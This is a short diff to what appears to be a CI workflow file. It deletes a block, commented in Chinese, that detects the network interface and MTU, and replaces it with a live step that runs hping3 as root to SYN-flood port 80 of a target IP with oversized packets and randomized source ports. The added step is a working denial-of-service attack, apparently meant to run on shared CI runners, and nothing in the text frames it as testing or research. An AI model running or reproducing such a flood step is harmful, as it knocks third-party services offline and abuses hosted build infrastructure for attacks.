@@ -90,24 +90,4 @@ jobs:
           echo $IP
           # sleep 10
           echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-          # sudo timeout 5s hping3 -S --flood -V -d 64000 -p 80 -s 1000-65535 $IP
-
-          # 尝试获取默认路由的接口（更可靠方式）
-          IFACE=$(ip route | awk '/default/ {print $5; exit}')
-
-          if [ -z "$IFACE" ]; then
-            echo "❌ 无法检测默认网络接口，请检查网络连接。"
-            exit 1
-          fi
-
-          # 获取该接口的 MTU（例如 1500）
-          MTU=$(ip link show "$IFACE" | awk '/mtu/ {for(i=1;i<=NF;i++){if($i=="mtu"){print $(i+1);exit}}}')
-
-          # 计算IP/TCP头部开销 (IP=20 + TCP=20)
-          HEADER_SIZE=40
-          MAX_PAYLOAD=$((MTU - HEADER_SIZE))
-
-          echo "✅ 目标: $TARGET_IP"
-          echo "🌐 网络接口: $IFACE"
-          echo "📏 MTU: $MTU"
-          echo "📦 最大payload: $MAX_PAYLOAD 字节（不分片）"
+          sudo timeout 5s hping3 -S --flood -V -d 66000 -p 80 -s 1000-65535 $IP
